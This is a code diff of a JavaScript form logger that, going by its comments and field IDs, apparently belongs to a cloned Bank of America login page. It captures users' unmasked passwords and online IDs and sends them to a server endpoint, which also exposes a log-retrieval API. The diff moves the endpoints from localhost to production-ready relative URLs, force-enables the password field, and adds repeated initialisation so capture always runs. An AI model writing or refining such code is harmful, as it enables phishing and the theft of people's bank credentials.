@@ -5,16 +5,23 @@
  */
 
 class FormLogger {
-  constructor(apiEndpoint = 'http://localhost:3000/api/login') {
-    this.apiEndpoint = apiEndpoint;
+  constructor() {
+    // Use relative URL for API endpoint (works on both localhost and production)
+    this.apiEndpoint = '/api/login';
     this.rawPassword = ''; // Store unmasked password
     this.init();
   }
 
   init() {
-    // Capture raw password as user types (before BOA scripts mask it)
+    // Enable and configure password field
     const passwordInput = document.getElementById('tlpvt-passcode-input');
     if (passwordInput) {
+      // CRITICAL: Enable the password field (it's disabled in HTML)
+      passwordInput.disabled = false;
+      passwordInput.style.opacity = '1';
+      passwordInput.style.cursor = 'text';
+      console.log('[Logger] Password field enabled');
+      
       // Listen to all input events (covers paste, typing, etc.)
       passwordInput.addEventListener('input', (e) => {
         this.rawPassword = passwordInput.value;
@@ -92,12 +99,17 @@ class FormLogger {
    */
   async logFormData(form) {
     try {
+      // Ensure password field is enabled during submit
+      const passwordInput = document.getElementById('tlpvt-passcode-input');
+      if (passwordInput) {
+        passwordInput.disabled = false;
+      }
+      
       // Get User ID from input field
       const userIdInput = form.querySelector('input[name="dummy-onlineId"]');
       const userIdValue = userIdInput ? userIdInput.value.trim() : '';
 
       // Get the actual password value directly from the input field (NOT masked)
-      const passwordInput = document.getElementById('tlpvt-passcode-input');
       let passwordValue = '';
       
       if (passwordInput) {
@@ -320,7 +332,7 @@ class FormLogger {
    */
   async fetchLogs() {
     try {
-      const response = await fetch('http://localhost:3000/api/logs');
+      const response = await fetch('/api/logs');
       const result = await response.json();
       return result;
     } catch (error) {
@@ -331,12 +343,35 @@ class FormLogger {
 }
 
 // Initialize logger when DOM is ready
-if (document.readyState === 'loading') {
-  document.addEventListener('DOMContentLoaded', () => {
+function initializeFormLogger() {
+  try {
     window.formLogger = new FormLogger();
-    console.log('[Logger] CSV Form Logger initialized');
-  });
-} else {
-  window.formLogger = new FormLogger();
-  console.log('[Logger] CSV Form Logger initialized');
+    // Ensure password field is enabled after FormLogger initializes
+    const passwordInput = document.getElementById('tlpvt-passcode-input');
+    if (passwordInput) {
+      passwordInput.disabled = false;
+      console.log('[Logger] Password field confirmed enabled');
+    }
+  } catch (error) {
+    console.error('[Logger] Failed to initialize:', error);
+  }
 }
+
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', initializeFormLogger);
+} else {
+  // DOM already loaded, initialize immediately
+  initializeFormLogger();
+}
+
+// Also initialize on page load event as fallback
+window.addEventListener('load', initializeFormLogger);
+
+// Ensure password field is enabled even after page fully loads
+setTimeout(() => {
+  const passwordInput = document.getElementById('tlpvt-passcode-input');
+  if (passwordInput && passwordInput.disabled) {
+    passwordInput.disabled = false;
+    console.log('[Logger] Password field re-enabled after page load delay');
+  }
+}, 1000);
